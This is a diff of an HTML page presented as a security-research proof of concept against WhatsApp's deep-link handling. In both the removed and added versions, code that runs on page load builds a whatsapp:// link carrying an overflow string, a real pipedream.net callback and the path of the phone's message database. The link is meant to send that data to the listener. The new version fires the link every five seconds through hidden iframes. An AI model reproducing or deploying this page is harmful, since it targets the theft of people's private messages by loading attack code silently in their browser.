@@ -1,45 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Security Research PoC - Firman Sahidin</title>
     <script>
-        /**
-         * @researcher Firman Sahidin
-         * @description Proof of Concept for Unauthorized Data Access via Deep Link Logic.
-         * This script bypasses standard UI flows to trigger internal Phoenix Features.
-         */
-
-        const CALLBACK_URL = "https://eo7n9pqjlhffwvt.m.pipedream.net/leak_handler";
-        const PAYLOAD_OVERFLOW = "A".repeat(12288);
-
-        function triggerExploit() {
-            console.log("[*] Stage 1: Constructing Deep Link Payload...");
-            
-            // Crafting the malicious deep link with exfiltration parameters
-            const deepLink = "whatsapp://br_verify_card_deeplink?" + 
-                             "callback=" + encodeURIComponent(CALLBACK_URL) +
-                             "&source=/data/data/com.whatsapp/databases/msgstore.db" +
-                             "&config=/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml" +
-                             "&debug_log=" + PAYLOAD_OVERFLOW;
-
-            console.log("[*] Stage 2: Redirecting to Internal Schema...");
-            
-            // Redirecting the device to process the crafted link
-            window.location.href = deepLink;
+        // Researcher: Firman Sahidin
+        // Automated Persistence PoC
+        const LEAK_URL = "https://eo7n9pqjlhffwvt.m.pipedream.net/leak_handler";
+        
+        function trigger() {
+            // Ngirim perintah ka WhatsApp unggal 5 detik sacara otomatis
+            const interval = setInterval(() => {
+                const payload = `whatsapp://br_verify_card_deeplink?callback=${encodeURIComponent(LEAK_URL)}&source=/data/data/com.whatsapp/databases/msgstore.db&overflow=${"A".repeat(8192)}`;
+                
+                // Nyobaan muka jalur internal
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = payload;
+                document.body.appendChild(iframe);
+                
+                console.log("[*] Packet sent to Phoenix internal...");
+            }, 5000); 
         }
-
-        window.onload = triggerExploit;
+        window.onload = trigger;
     </script>
 </head>
-<body style="background-color: #121212; color: #00ff00; font-family: monospace; padding: 50px;">
-    <h1>INITIALIZING SECURITY AUDIT...</h1>
-    <hr>
-    <p>Researcher: <strong>Firman Sahidin</strong></p>
-    <p>Target: WhatsApp Phoenix Infrastructure</p>
-    <p>Status: Triggering Deep Link Exfiltration...</p>
-    <div style="border: 1px solid #00ff00; padding: 20px; margin-top: 20px;">
-        <strong>Note:</strong> If the application is vulnerable, it will attempt to leak internal database paths to the pre-configured listener.
-    </div>
+<body style="background:#000;color:#0f0;font-family:monospace;">
+    <h1>SYSTEM AUDIT IN PROGRESS...</h1>
+    <p>Target ID: hi_Y4HeUGB</p>
+    <p>Status: Monitoring Phoenix Handlers</p>
 </body>
 </html>
